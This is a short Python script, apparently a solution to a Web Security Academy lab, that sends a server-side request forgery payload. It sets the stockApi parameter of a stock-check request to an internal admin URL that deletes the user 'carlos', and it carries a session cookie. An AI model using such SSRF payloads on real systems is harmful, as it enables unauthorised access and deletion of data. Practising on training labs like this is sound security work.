import requests

# URL endpoint
url = "https://0a7100330337cbe784d1865400b20068.web-security-academy.net/product/stock"

# Custom headers
headers = {
    "Cookie": "session=fagwbsZl2qRIJMUvZzND7wSqLA6vWL1v",
    "Origin": "https://0a7100330337cbe784d1865400b20068.web-security-academy.net",
    "Referer": "https://0a7100330337cbe784d1865400b20068.web-security-academy.net/product?productId=1",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Data payload
data = {
    "stockApi": "http://192.168.0.239:8080/admin/delete?username=carlos"
}

# Perform the POST request
response = requests.post(url, headers=headers, data=data)

# Print the response (status code and body)
print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
